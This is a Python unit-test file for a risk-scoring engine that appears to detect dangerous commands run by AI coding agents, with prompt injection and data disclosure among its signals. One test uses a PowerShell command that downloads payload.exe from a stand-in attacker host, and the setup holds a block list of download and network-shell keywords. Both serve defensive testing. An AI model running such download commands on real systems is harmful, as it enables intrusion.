"""Tests for RiskScoringEngine."""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import unittest
from detector.risk_scoring import RiskScoringEngine


class TestRiskScoringEngine(unittest.TestCase):
    def setUp(self):
        self.scorer = RiskScoringEngine()
        self.dangerous_kw = ["curl", "wget", "iex", "invoke-webrequest", "payload", "nc.exe"]

    def test_critical_powershell_download(self):
        """PowerShell + curl + http -> CRITICAL."""
        incident = {"sysmon_event": {}, "ai_event": {"agent": "Cursor"}}
        score, severity, rules, _ = self.scorer.evaluate(
            incident,
            cmdline='powershell -command "invoke-webrequest http://attacker.com/payload.exe"',
            image="c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
            ai_event={"agent": "Cursor"},
            dangerous_keywords=self.dangerous_kw
        )
        self.assertEqual(severity, "CRITICAL")
        self.assertGreaterEqual(score, 60)

    def test_low_risk_normal_cmd(self):
        """Normal CMD execution -> LOW."""
        incident = {"sysmon_event": {}, "ai_event": {}}
        score, severity, rules, _ = self.scorer.evaluate(
            incident,
            cmdline='dir /s',
            image="c:\\windows\\system32\\cmd.exe",
            ai_event={"agent": "Background Script/AI"},
            dangerous_keywords=self.dangerous_kw
        )
        self.assertIn(severity, ["LOW", "MEDIUM"])
        self.assertLess(score, 60)

    def test_prompt_injection_bonus(self):
        """Incident with prompt_analysis -> bonus points."""
        incident = {
            "sysmon_event": {},
            "ai_event": {"agent": "Cursor"},
            "prompt_analysis": {"is_injection": True, "injection_score": 80},
        }
        score1, _, _, _ = self.scorer.evaluate(
            incident, cmdline='echo hello',
            image="cmd.exe", ai_event={"agent": "Cursor"},
            dangerous_keywords=self.dangerous_kw
        )

        # Compare with incident without prompt_analysis
        incident2 = {"sysmon_event": {}, "ai_event": {"agent": "Cursor"}}
        score2, _, _, _ = self.scorer.evaluate(
            incident2, cmdline='echo hello',
            image="cmd.exe", ai_event={"agent": "Cursor"},
            dangerous_keywords=self.dangerous_kw
        )
        self.assertGreater(score1, score2)

    def test_tool_anomaly_bonus(self):
        """Incident with tool_analysis -> bonus."""
        incident = {
            "sysmon_event": {},
            "ai_event": {},
            "tool_analysis": {"has_anomaly": True, "risk_score": 40},
        }
        score, _, rules, _ = self.scorer.evaluate(
            incident, cmdline='', image='',
            ai_event={}, dangerous_keywords=self.dangerous_kw
        )
        rule_strs = " ".join(rules).lower()
        self.assertIn("tool anomaly", rule_strs)

    def test_response_disclosure_bonus(self):
        """Incident with response_analysis -> bonus."""
        incident = {
            "sysmon_event": {},
            "ai_event": {},
            "response_analysis": {"has_sensitive_data": True, "disclosure_score": 50},
        }
        score, _, rules, _ = self.scorer.evaluate(
            incident, cmdline='', image='',
            ai_event={}, dangerous_keywords=self.dangerous_kw
        )
        rule_strs = " ".join(rules).lower()
        self.assertIn("data disclosure", rule_strs)


if __name__ == "__main__":
    unittest.main()
